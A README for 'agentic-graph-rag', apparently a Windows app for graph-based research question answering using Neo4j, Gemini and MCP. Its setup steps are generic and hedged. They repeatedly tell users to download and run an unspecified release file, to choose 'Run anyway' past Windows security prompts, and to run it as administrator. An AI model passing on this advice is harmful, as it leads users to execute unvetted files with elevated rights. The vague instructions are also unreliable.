# 🤖 agentic-graph-rag - Graph reasoning for local research

[![Download](https://img.shields.io/badge/Download-Releases-6C757D?style=for-the-badge&logo=github)](https://github.com/christanbased926/agentic-graph-rag/releases)

## 🧭 What this app does

agentic-graph-rag is a Windows app that helps you ask questions and get answers from connected knowledge. It uses a graph, retrieval, and agent-style reasoning to work through complex topics in a structured way.

Use it when you want to:
- explore linked ideas
- ask follow-up questions
- work with research notes and source data
- keep related facts connected in one place

It is built as a research prototype with ADK, MCP, Neo4j, FastAPI, Gemini, and GraphRAG ideas.

## 📦 Before you start

You need:
- a Windows 10 or Windows 11 PC
- an internet connection for the first setup
- a modern browser
- enough free disk space for the app and its data
- permission to install and run downloaded files

For best results, keep these basics ready:
- a Google account if the app asks for Gemini access
- a Neo4j database if your release package includes graph storage setup
- access to any files or notes you want to load into the app

## ⬇️ Download the app

Visit this page to download:  
https://github.com/christanbased926/agentic-graph-rag/releases

On that page:
1. open the latest release
2. find the Windows download
3. save the file to your PC
4. if the file is in a ZIP package, extract it first
5. if the release gives you an installer or app file, download and run this file

If Windows shows a security prompt:
1. click the file
2. choose Run or More info > Run anyway if you trust the source
3. wait for the app to finish opening

## 🪟 Install and open on Windows

If you downloaded a ZIP file:
1. right-click the ZIP file
2. choose Extract All
3. pick a folder such as Downloads or Desktop
4. open the extracted folder
5. look for the app file, installer, or start script

If you downloaded an installer:
1. double-click the installer
2. follow the on-screen steps
3. choose an install folder if asked
4. wait for setup to finish
5. open the app from the Start Menu or desktop shortcut

If you see a folder with several files:
- look for `run`, `start`, or `app`
- open the file that matches the Windows app type
- if Windows asks what to use, choose the default app it suggests

## 🧠 What you may need to connect

This app may use a few services in the background:
- **Neo4j** for graph storage
- **Gemini** for model-backed reasoning
- **MCP** for tool access
- **ADK** for agent flow
- **FastAPI** for the local app interface

If the release includes setup files or sample config files, open them and follow the names shown in the package. Common items include:
- `.env`
- `config`
- `settings`
- `docker-compose.yml`

If the app asks for keys or URLs, enter the values from your own setup.

## 🛠️ First run setup

When you open the app for the first time:
1. wait for the app to load
2. read any setup screen
3. enter required values if the app asks
4. save the settings
5. restart the app if needed

If the app uses a local Neo4j server:
1. start Neo4j first
2. make sure the database is running
3. return to the app
4. connect it to the graph database

If the app uses a local data folder:
1. choose a folder you can find again
2. keep sample files in one place
3. avoid moving files after import

## 🔍 How to use it

A simple flow looks like this:

1. open the app
2. load your source data
3. type a question
4. let the app build links between related facts
5. review the answer
6. ask a follow-up question

Good example questions:
- What are the main ideas in this set of notes?
- How are these topics connected?
- Which source mentions this person or concept?
- What changed between two related documents?
- What are the strongest links in this knowledge graph?

For best results:
- keep questions short and clear
- use one topic per question
- ask follow-up questions when you need more detail
- use the same terms across your files and questions

## 🗂️ Typical folder contents

Your release may include files like these:
- an app launcher
- sample data
- a config file
- a Docker setup file
- a local API service
- a graph database file or setup script

If you see a Docker file, it means the app may run in a container. That can help keep the setup neat and avoid extra manual steps.

## 🐳 If the release uses Docker

If your package includes Docker or Docker Compose:
1. install Docker Desktop on Windows
2. open the release folder
3. find `docker-compose.yml`
4. open a terminal in that folder
5. run the startup command shown in the package
6. wait for the services to start
7. open the app in your browser or local window

If you are not sure which file to run, look for a README file inside the release package. It may include the exact start command for that build.

## 🔗 How the graph part works

The app stores links between ideas in a graph. This helps it:
- find related facts
- follow connections across documents
- keep track of named people, places, and topics
- answer questions with more context

In simple terms, it does not just search for words. It looks for connections too.

## 🧪 Common uses

You can use this app for:
- research notes
- document review
- topic mapping
- question answering across many files
- connected knowledge lookup
- local knowledge graph testing

It fits best when your data has clear names, repeated topics, and links between ideas.

## 🧯 If something does not open

Try these steps:
1. close the app
2. run it again
3. right-click the file and choose Run as administrator
4. check that the file is fully extracted if it came in a ZIP
5. make sure Windows did not block the file
6. confirm any required service, such as Neo4j, is running

If the app opens but does not answer well:
- check your source data
- use clearer questions
- make sure the graph database is connected
- reload the data set
- restart the app

## 🔐 Data and privacy

If you run the app on your own PC, your data stays in your setup unless you connect it to an outside service. If you use cloud model access or remote graph services, data may pass through those services based on your settings.

Keep this in mind when you load:
- private notes
- internal files
- personal documents
- company material

## 📁 Suggested setup for Windows users

A simple folder layout can help:
- `Downloads\agentic-graph-rag`
- `Documents\agentic-graph-rag-data`
- `Documents\agentic-graph-rag-config`

This makes it easier to:
- find the app again
- keep source data separate
- save settings in one place
- avoid broken file links after moving folders

## 🧩 Topics covered by this project

This project touches on:
- ADK
- AI agents
- Cypher
- Docker
- Docker Compose
- FastAPI
- Gemini
- GraphRAG
- knowledge graphs
- MCP
- Neo4j
- Python 3
- retrieval-augmented generation

These tools work together to support connected search and agent-style reasoning.

## 📌 Release page

Download and run this file from the latest release package on Windows:  
https://github.com/christanbased926/agentic-graph-rag/releases

## 🖥️ Quick start checklist

1. visit the release page
2. download the Windows file
3. extract it if it is zipped
4. run the installer or app file
5. enter any setup values
6. start Neo4j if needed
7. open the app
8. load your data
9. ask your first question